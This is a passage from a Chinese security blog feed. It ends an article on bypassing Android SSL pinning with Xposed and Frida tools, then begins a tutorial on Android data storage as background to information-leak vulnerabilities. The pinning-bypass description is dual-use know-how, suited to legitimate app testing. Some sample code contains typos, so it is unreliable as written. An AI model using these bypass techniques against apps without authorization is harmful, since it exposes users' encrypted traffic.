href="#2-Android-7-0后破解https-的ssl-pinning" class="headerlink" title="2.Android 7.0后破解https 的ssl pinning"></a>2.Android 7.0后破解https 的ssl pinning</h3><p>Android7.0后，系统做了改动：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">APP 默认不信任用户域的证书。之前把MITM的ssl证书，安装到 受信任的凭据 -&gt; 用户 就没用了，因为不受信任了。只信任（安装到）系统域的证书</span><br></pre></td></tr></table></figure><p>因此这导致我们使用如Fiddler、Charles等抓包软件导入证书后，仍然不能在捕获https的密文，甚至无法解析请求</p><p>解决思路：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）让系统信任Charles的ssl证书</span><br><span class="line">改自己的app的配置，允许https抓包，这就需要有app的源码</span><br><span class="line">把证书放到受系统信任的系统证书中去。前提是手机已root</span><br><span class="line">（2）绕开https不去校验</span><br><span class="line">使用基于Xposed等框架的JustTrustMe、基于Frida框架的r0capyure等</span><br></pre></td></tr></table></figure><h3 id="3-证书绕过原理"><a href="#3-证书绕过原理" class="headerlink" title="3.证书绕过原理"></a>3.证书绕过原理</h3><p>我们基于上文提出第二种思路，详细解析当下的JustTrustMe为代表的证书绕过原理</p><p>通过前面我们了解到，证书验证中到关键是 TrustManager，而绕过证书验证就需要从它入手。xpsoed 上证书校验的绕过插件就是这么干的，目前比较流行的两款基于 xposed 的绕过证书验证的模块有两款 JustTrustMe 和 SSLkiller，针对HttpsURLConnection，OkHttp 框架各自的证书校验函数</p><p>这两款工具通过 hook 这些关键函数，或替换 TrustManager(信任所有证书)或令其验证函数直接失效(函数替换，不做任何校验)，以达到绕过的目的</p><p>绕过证书的实现原理图，下图参考博客<a href="https://juejin.cn/post/6992844908788711438">安卓 https 证书校验和绕过</a>：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/33.png" alt="image-20211205155437510"></p><h3 id="4-工具使用"><a href="#4-工具使用" class="headerlink" title="4.工具使用"></a>4.工具使用</h3><h4 id="（1）Xposed-JustTrustMe"><a href="#（1）Xposed-JustTrustMe" class="headerlink" title="（1）Xposed+JustTrustMe"></a>（1）Xposed+JustTrustMe</h4><p><a href="https://github.com/Fuzion24/JustTrustMe">JustTrustMe下载地址</a></p><p>使用步骤十分简单，就在手机上安装xposed框架，具体安装参考前文帖子，然后将JustTrustMe模块安装就可以使用了</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0015/34.png" alt="image-20211205184421953"></p><h4 id="（2）Frida脚本"><a href="#（2）Frida脚本" class="headerlink" title="（2）Frida脚本"></a>（2）Frida脚本</h4><p>下面是两种比较火的frida抓包脚本</p><p><a href="https://codeshare.frida.re/@masbog/frida-android-unpinning-ssl/">frida-android-unpinning-ssl</a></p><p><a href="https://github.com/r0ysue/r0capture">r0capture</a></p><p>使用步骤：</p><p>开启frida_server注入脚本就可以了，具体可以参考博客网址</p><h2 id="五、实验总结"><a href="#五、实验总结" class="headerlink" title="五、实验总结"></a>五、实验总结</h2><p>本文从Android Http&#x2F;Https通信过程出发，讲述了Android Http&#x2F;Https通信漏洞产生的原因，也拿了很多的漏洞复现实例来进行一一说明，最后还简单介绍了当下对https转包的处理和原因，当然这部分东西很多还需要进一步深入的研究，本文可能还未归纳完全所有的情况，就请大家指正了</p><h2 id="六、参考文献"><a href="#六、参考文献" class="headerlink" title="六、参考文献"></a>六、参考文献</h2><p>Android http&#x2F;https原理解析：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一行代码</span><br><span class="line">Frida 逆向和抓包实战</span><br><span class="line">https://zhuanlan.zhihu.com/p/330393659</span><br><span class="line">https://xiaoyue26.github.io/2018/09/26/2018-09/%E9%80%9A%E4%BF%97%E7%90%86%E8%A7%A3SSL-TLS%E5%8D%8F%E8%AE%AE%E5%8C%BA%E5%88%AB%E4%B8%8E%E5%8E%9F%E7%90%86/</span><br></pre></td></tr></table></figure><p>Android https漏洞挖掘：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://www.geek-share.com/detail/2727192403.html</span><br><span class="line">https://www.cxyzjd.com/article/u010982507/85258477</span><br><span class="line">https://www.jianshu.com/p/84df0a40127c</span><br></pre></td></tr></table></figure><p>Android 证书绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://juejin.cn/post/6992844908788711438</span><br><span class="line">https://www.jianshu.com/p/34912804bf08</span><br><span class="line">https://www.panaihua.com/android-catchhttp/</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;本文主要介绍Android http&amp;#x2F;https方面的安全漏洞问题，并会从原理并结合案例来逐一讲解，本文一部分参考网络上一些博客，并在相应部分给出链接&lt;/p&gt;
&lt;p&gt;本文第二节主要讲述Android http&amp;#x2F;https相关的基础知识&lt;/p&gt;
&lt;p&gt;本文第三节为漏洞原理解析和漏洞复现&lt;/p&gt;
&lt;p&gt;本文第四节为Android https转包漏洞介绍&lt;/p&gt;</summary>
    
    
    
    <category term="Android APP漏洞之战" scheme="http://security-kitchen.com/categories/Android-APP%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%88%98/"/>
    
    
    <category term="漏洞挖掘" scheme="http://security-kitchen.com/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="工具" scheme="http://security-kitchen.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>Android App漏洞之战（14）——信息泄露漏洞详解</title>
    <link href="http://security-kitchen.com/2023/02/13/bug0014/"/>
    <id>http://security-kitchen.com/2023/02/13/bug0014/</id>
    <published>2023-02-13T01:21:19.000Z</published>
    <updated>2023-12-23T09:13:44.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>好久没有更新帖子了，最近一直都比较忙，这里首先祝大家腊八节快乐。本文主要围绕Android APP漏洞中的信息泄露漏洞展开描述，因为挖掘Android APP信息泄露漏洞的思路各有差异，所以本文只是基于Android APP中较为基础的信息泄露的漏洞实例开始讲述。</p><span id="more"></span><p>本文第二节主要讲述Android中存储的基本方式</p><p>本文第三节主要讲述信息泄露漏洞的分类</p><p>本文第四节主要讲述漏洞的原因和具体复现</p><h2 id="二、基础知识"><a href="#二、基础知识" class="headerlink" title="二、基础知识"></a>二、基础知识</h2><p>APP 信息泄露漏洞往往和Android APP的数据存储方式有关，所以我们这里首先详细的了解Android的数据存储方式。我们知道Android中数据存储的方式共有五种，分别为：文件存储、SharedPreferences、SQLite数据库存储、ContentProvider、网络存储。</p><h3 id="1-文件存储"><a href="#1-文件存储" class="headerlink" title="1.文件存储"></a>1.文件存储</h3><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/1.png" alt="image-20220102214434734"></p><p>下面我们将结合上面的思维导图依次讲解</p><h4 id="（1）内部存储"><a href="#（1）内部存储" class="headerlink" title="（1）内部存储"></a>（1）内部存储</h4><p>内部存储一般存储一些应用的数据，如apk、shareprefence、database数据、webview缓存和图片缓存等等，内部存储一般存储在<code>/data/</code>下面，这些都需要用户获得root权限后才能访问到</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/2.png" alt="image-20220102215413773"></p><p>我们以root权限的模式进入：</p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/3.png" alt="image-20220102215509371"></p><p>下面我们介绍常见的一些内部存储目录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/data/app/    存储着我们手机上安装的apk文件</span><br><span class="line">/data/data/包名/share_prefs  存储对应的应用程序中的shareprefence存储文件</span><br><span class="line">/data/data/包名/cache    存储对应的应用程序中的cache缓存文件</span><br><span class="line">/data/data/包名/databases  存储对应的应用程序中的数据库文件</span><br><span class="line">/data/data/包名/files      存储对应的应用程序中的资源文件</span><br></pre></td></tr></table></figure><p>内部存储的特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">内部存储的文件和目录只能被我们的app自己所访问，别的app不能访问。</span><br><span class="line">内部存储中的私有目录，当用户卸载app之后，改文件目录中关于该应用的信息就会被删除。</span><br><span class="line">内部存储是可用的。</span><br><span class="line">内部存储大小有限，不适合存储大量数据。</span><br><span class="line">只有root的手机，才能从手机文件管理器看见，否则都是隐藏着的。</span><br></pre></td></tr></table></figure><h4 id="（2）外部存储"><a href="#（2）外部存储" class="headerlink" title="（2）外部存储"></a>（2）外部存储</h4><p>Android4.4以前，手机自身的存储就叫内部存储，插入SD卡的存储叫外部存储，然而Android 4.4以后，手机自带的存储很大，因此现在的外部存储分为两部分：SD卡和扩展卡内存。外部存储一般分为两类，私有目录和公有目录，私有目录里面的数据会随着应用的卸载而删除，公有目录并不会</p><p>自身的外部存储目录：<code>/storage/emulated/0/Android/data/packagename/files</code></p><p>存储卡的存储目录：<code>/storage/extSdCard/Android/data/packagename/files</code></p><p><img src="https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0014/4.png" alt="image-20220103165631522"></p><p>外部存储的特点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">公有目录任何程序都可以访问，私有目录自身可以访问。</span><br><span class="line">并不一定是可用的，因为SD卡会被挂载。</span><br><span class="line">外部存储中的私有目录中的数据会随着应用的卸载而删除，公有目录则不会。</span><br></pre></td></tr></table></figure><h5 id="lt-1-gt-私有目录"><a href="#lt-1-gt-私有目录" class="headerlink" title="&lt;1&gt; 私有目录"></a>&lt;1&gt; 私有目录</h5><p>私有目录，在Android 4.4以上，不需要注册和用户授权SD读写的权限，就可以在应用的私有目录进行读写文件，文件不能被其他应用访问，用户删除应用时，对应的应用的私有目录也会被删除</p><p>私有目录地址：<code>/storage/emulated/0/Android/data/packagename</code></p><p>相关API:</p><p>私有目录访问的API都在<code>ContextWrapper</code>对象上，可以直接通过Activity或Context进行调用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getExternalCacheDir()： 访问/storage/emulated/0/Android/data/应用包名/cache目录，该目录用来存放应用的缓存文件，当我们通过应用删除缓存文件的时候，该目录下的文件会被清除</span><br><span class="line">getExternalFilesDir(): 访问/storage/emulated/0/Android/data/应用包名/files 目录,该目录用来存放应用的数据</span><br></pre></td></tr></table></figure><h5 id="lt-2-gt-公共目录"><a href="#lt-2-gt-公共目录" class="headerlink" title="&lt;2&gt; 公共目录"></a>&lt;2&gt; 公共目录</h5><p>公共目录必须需要用户授权读写的权限，就意味需要在<code>AndroidManifest.xml</code>中注册用户权限</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 往SDCard写入数据权限 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">uses-permission</span> <span class="attr">android:name</span>=<span class="string">&quot;android.permission.READ_EXTERNAL_STORAGE&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure><p>Android 6.0系统之后需要申请用户权限，并获得用户授权，才能读写文件，公共目录相对开放，我们可以访问其他APP存在公共目录下的文件，并且当APP被删除时，并不会删除应用存在公共目录下的文件</p><p>相关API:</p><p>公共目录可以通过Environment对象，访问读写公共目录的文件</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Environment.getExternalStorageDirectory() 访问外部存储设备公共根目录</span><br><span class="line">Environment.getExternalStorageState() 获得外部存储SD卡的状态</span><br></pre></td></tr></table></figure><h5 id="（3）系统存储目录"><a href="#（3）系统存储目录" class="headerlink" title="（3）系统存储目录"></a>（3）系统存储目录</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getRootDirectory()：对应获取系统分区根路径:/system</span><br><span class="line"><span class="title function_">getDataDirectory</span><span class="params">()</span>：对应获取用户数据目录路径:/data</span><br><span class="line"><span class="title function_">getDownloadCacheDirectory</span><span class="params">()</span>：对应获取用户缓存目录路径:/cache</span><br></pre></td></tr></table></figure><p>补充：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（<span class="number">1</span>）升级应用程序后的apk文件在哪？</span><br><span class="line">一般我们从服务器端下载的app需要放到外部存储目录下面，而不是内部存储目录，即/storage/emulated/<span class="number">0</span>/Android/data/packagename下</span><br><span class="line">（<span class="number">2</span>）清除数据和清除缓存的区别？</span><br><span class="line">清除数据清除的是保存在app中所有数据，就是上面提到的位于packagename下面的所有文件，包含内部存储(/data/data/packagename/)和外部存储(/storage/emulated/<span class="number">0</span>/Android/data/packagename/)，但不会影响SD卡的数据</span><br><span class="line">缓存是程序运行时的临时存储空间，缓存文件存放在getCacheDir()或者 getExternalCacheDir()路径下</span><br></pre></td></tr></table></figure><h4 id="（4）文件存储的读写方式"><a href="#（4）文件存储的读写方式" class="headerlink" title="（4）文件存储的读写方式"></a>（4）文件存储的读写方式</h4><p>写入文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">save</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;Data to save&quot;</span>;</span><br><span class="line">      <span class="type">FileOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">ButteredWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">            out = openFileOutput(<span class="string">&quot;data&quot;</span>,Context.MODE_PRIVATE);  <span class="comment">//MODE_PRIVATE（默认）：覆盖、MODE_APPEND：追加</span></span><br><span class="line">            writer = <span class="keyword">new</span> <span class="title class_">ButteredWriter</span>(<span class="keyword">new</span> <span class="title class_">OutputSreamWriter</span>(out));</span><br><span class="line">            writer.write(data);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">      &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                  <span class="keyword">if</span>(writer!=<span class="literal">null</span>)&#123;</span><br><span class="line">                        writer.close();</span><br><span class="line">                  &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                  e.printStackTrace();</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取文件：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">load</span><span class="params">()</span>&#123;</span><br><span class="line">      <span class="type">FileInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">ButteredReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="type">StringBuilder</span> <span class="variable">builder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">            in = openFileInput(<span class="string">&quot;data&quot;</span>);</span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">ButteredReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">            String line= <span class="string">&quot;&quot;</span>;</span><br><span class="line">            <span class="keyword">while</span>((line = reader.readline()) != <span class="literal">null</span>)&#123;</span><br><span class="line">                   builder.append();</span><br><span class="line">            &#125;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">      &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(reader != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="keyword">try</span>&#123;</span><br><span class="line">                          reader.close();</span><br><span class="line">                    &#125;<span class="keyword">catch</span>(IOException e)&#123;</span><br><span class="line">                          e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">             &#125;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-SharedPreferences"><a href="#2-SharedPreferences" class="headerlink" title="2.SharedPreferences"></a>2.SharedPreferences</h3><p>SharedPreference是Android平台上一个轻量级的存储类，主要是保存一些常用的配置比如窗口状态，是使用键值对的方式来存储数据，这样就可以支持多种不同的数据类型存储，进行数据持久化就会比文件方便很多</p><p>默认存储路径：<code>/data/data/packageName/shared_prefs</code></p><p>获取SharedPreferences对象的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Context的getSharedPreferences()方法，参数一是文件名，参数二是操作模式</span><br><span class="line">Activity的getPreferences()方法，参数为操作模式，使用当前应用程序包名为文件名</span><br><span class="line">PreferenceManager的getDefaultSharedPreferences()静态方法，接收Context参数，使用当前应用程序包名为文件名</span><br></pre></td></tr></table></figure><h4 id="（1）SharedPreferences数据的存取"><a href="#（1）SharedPreferences数据的存取" class="headerlink" title="（1）SharedPreferences数据的存取"></a>（1）SharedPreferences数据的存取</h4><p>SharedPreference的存储：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)根据Context获取SharedPreferences对象</span><br><span class="line">(<span class="number">2</span>)利用edit()方法获取Editor对象</span><br><span class="line">(<span class="number">3</span>)ditor对象存储key-value键值对数据</span><br><span class="line">(<span class="number">4</span>)apply()提交数据</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;     </span><br><span class="line"> <span class="meta">@Override</span> </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123; </span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState); </span><br><span class="line">        setContentView(R.layout.main); </span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取SharedPreferences对象 </span></span><br><span class="line">        <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> MainActivity.<span class="built_in">this</span>;        </span><br><span class="line">        <span class="type">SharedPreferences</span> <span class="variable">sp</span> <span class="operator">=</span> ctx.getSharedPreferences(<span class="string">&quot;SP&quot;</span>, MODE_PRIVATE); <span class="comment">//MODE_PRIVATE（默认）：只有当前的应用程序才能对文件进行读写、MODE_MULTI_PROCESS：用于多个进程对同一个SharedPreferences进行读写</span></span><br><span class="line">        <span class="comment">//存入数据 </span></span><br><span class="line">        <span class="type">Editor</span> <span class="variable">editor</span> <span class="operator">=</span> sp.edit(); </span><br><span class="line">        editor.putString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;Tom&quot;</span>); </span><br><span class="line">        editor.putInt(<span class="string">&quot;age&quot;</span>, <span class="number">28</span>); </span><br><span class="line">        editor.putBoolean(<span class="string">&quot;married&quot;</span>, <span class="literal">true</span>); </span><br><span class="line">        editor.apply(); </span><br><span class="line"></span><br><span class="line">        <span class="comment">//返回STRING_KEY的值 </span></span><br><span class="line">        Log.d(<span class="string">&quot;SP&quot;</span>, sp.getString(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;none&quot;</span>)); </span><br><span class="line">        <span class="comment">//如果NOT_EXIST不存在，则返回值为&quot;none&quot; </span></span><br><span class="line">        Log.d(<span class="string">&quot;SP&quot;</span>, sp.getString(<span class="string">&quot;NOT_EXIST&quot;</span>, <span class="string">&quot;none&quot;</span>)); </span><br><span class="line">     &#125; </span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SharedPreference数据的读取：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">SharedPreferences</span> <span class="variable">pref</span> <span class="operator">=</span> getSharedPreferences(<span class="string">&quot;data&quot;</span>,MODE_PRIVATE);</span><br><span class="line"><span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> pref.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="type">int</span> <span class="variable">age</span> <span class="operator">=</span> pref.getInt(<span class="string">&quot;age&quot;</span>);</span><br><span class="line"><span class="type">boolean</span> <span class="variable">isMarried</span> <span class="operator">=</span> pref.getBoolean(<span class="string">&quot;isMarried&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="3-SQLite数据库存储"><a href="#3-SQLite数据库存储" class="headerlink" title="3. SQLite数据库存储"></a>3. SQLite数据库存储</h3><p>SharedPreferences对象与SQLite数据库相比，免去了创建数据库、创建表、写SQL语句等操作，但是其只能存储boolean，int，float，long和String五种简单的数据类型，而且SharedPreferences是以明文的形式存储密钥信息，往往存在一定的安全隐患。为此Android还提供了一个轻量级的数据库SQLite数据库，SQLite是轻量级嵌入式数据库引擎，它支持 SQL 语言，并且只利用很少的内存就有很好的性能</p><p>默认存储路径：<code>/data/data/packagename/databases</code></p><h4 id="（1）数据库的创建"><a href="#（1）数据库的创建" class="headerlink" title="（1）数据库的创建"></a>（1）数据库的创建</h4><p>Android 提供了SQLiteOpenHelper类帮助创建和升级数据库，SQLiteOpenHelper子类至少需要实现三个方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>构造函数，调用父类SQLiteOpenHelper的构造函数。需要四个参数（上下文环境、数据库名称、查询数据的游标Cursor(通常为<span class="literal">null</span>)、当前数据库的版本号）</span><br><span class="line"><span class="number">2.</span>onCreate（）方法，它需要一个 SQLiteDatabase 对象作为参数，根据需要对这个对象填充表和初始化数据</span><br><span class="line"><span class="number">3.</span>onUpgrage() 方法，它需要三个参数，一个 SQLiteDatabase 对象，一个旧的版本号和一个新的版本号，这样就可以方便的实现数据库的升级</span><br></pre></td></tr></table></figure><p>继承 SQLiteOpenHelper 创建数据库</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span> &#123;</span><br><span class="line">    <span class="comment">//1.构造方法</span></span><br><span class="line">  MyDatabaseHelper(Context context, String name, CursorFactory cursorFactory, <span class="type">int</span> version)  </span><br><span class="line">  &#123;      </span><br><span class="line">    <span class="built_in">super</span>(context, name, cursorFactory, version);      </span><br><span class="line">     &#125;      </span><br><span class="line"></span><br><span class="line">     <span class="meta">@Override</span>     </span><br><span class="line">     <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(SQLiteDatabase db)</span> &#123;      </span><br><span class="line">         <span class="comment">// TODO 创建数据库后，对数据库的操作      </span></span><br><span class="line">     &#125;      </span><br><span class="line"></span><br><span class="line">     <span class="meta">@Override</span>     </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;      </span><br><span class="line">         <span class="comment">// TODO 升级数据库版本 </span></span><br><span class="line">     &#125;      </span><br><span class="line"></span><br><span class="line"> <span class="meta">@Override</span>     </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(SQLiteDatabase db)</span> &#123;      </span><br><span class="line">         <span class="built_in">super</span>.onOpen(db);        </span><br><span class="line">         <span class="comment">// TODO 每次成功打开数据库后首先被执行      </span></span><br><span class="line">     &#125;      </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="（2）数据库的更新"><a href="#（2）数据库的更新" class="headerlink" title="（2）数据库的更新"></a>（2）数据库的更新</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyDatabaseHelper</span> <span class="keyword">extends</span> <span class="title class_">SQLiteOpenHelper</span>&#123;  </span><br><span class="line">    ......</span><br><span class="line">    <span class="comment">//当打开数据库时传入的版本号与当前的版本号不同时会调用该方法  </span></span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onUpgrade</span><span class="params">(SQLiteDatabase db, <span class="type">int</span> oldVersion, <span class="type">int</span> newVersion)</span> &#123;   </span><br><span class="line">          db.execSQL(<span class="string">&quot;drop table if exists Book&quot;</span>);</span><br><span class="line">          onCreate(db):</span><br><span class="line">    &#125;    </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>只要我们在MainActivity中将version改为大于原来版本号，就可以让<code>onUpgrade()</code>方法得到执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">MyDatabaseHelper</span> <span class="variable">helper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyDatabaseHelper</span>(<span class="built_in">this</span>,<span class="string">&quot;BookStore.db&quot;</span>,<span class="literal">null</span>,<span class="number">2</span>);</span><br><span class="line">helper.getWritableDatabase(); </span><br></pre></td></tr></table></figure><h4 id="（3）数据库的基本操作"><a href="#（3）数据库的基本操作" class="headerlink" title="（3）数据库的基本操作"></a>（3）数据库的基本操作</h4><p>添加数据：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 